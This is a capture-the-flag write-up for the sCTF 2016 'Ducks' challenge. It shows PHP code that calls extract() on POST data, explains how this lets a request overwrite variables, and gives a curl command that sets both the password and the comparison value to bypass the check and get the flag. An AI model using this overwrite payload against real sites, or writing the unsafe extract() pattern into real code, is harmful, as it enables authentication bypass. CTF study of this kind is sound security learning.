#Ducks

##[The ducks](http://ducks.sctf.michaelz.xyz/) and I have a unfinished score to settle.

**Hint:** *If you've remember HSF, you'll know that The Ducks is unsolvable.*

Viewing the source code of this challenge, we appear to have some awkward use of extract...

```
<?php if ($_SERVER["REQUEST_METHOD"] == "POST") { ?>
                        <?php
                        extract($_POST);
                        if ($pass == $thepassword_123) { ?>
                            <div class="alert alert-success">
                                <code><?php echo $theflag; ?></code>
                            </div>
                        <?php } ?>
                    <?php } ?>
```


The exploit:
>PHP has a function named extract() to take all provided GET and POST requests and assign them to internal variables. Developers will, at times, use this function instead of manually assigning $_POST[var1] to $var1. This function will overwrite any previously defined variables, including server variables. Extract() has options which prevent overwriting previously-defined variables, however this safety is not enabled by default, and developers might not enable the safety, just as many do not perform input validation. This vulnerability is similar in design to the register globals vulnerabilities present in PHP.

[Source](https://davidnoren.com/post/php-extract-vulnerability.html)

So, now it's pretty trivial. The goal is to set $pass equal to the same value as $thepassword_123. I opted to use curl for this.

`curl 'http://ducks.sctf.michaelz.xyz/' --data 'pass=t&thepassword_123=t'`

grepping the results for the flag provides a positive result:
`<code>sctf{maybe_i_shouldn't_have_extracted_everything_huh}</code>`

![flag](https://github.com/HackThisCode/CTF-Writeups/blob/master/2016/SCTF/Ducks/flag.png "Flag")
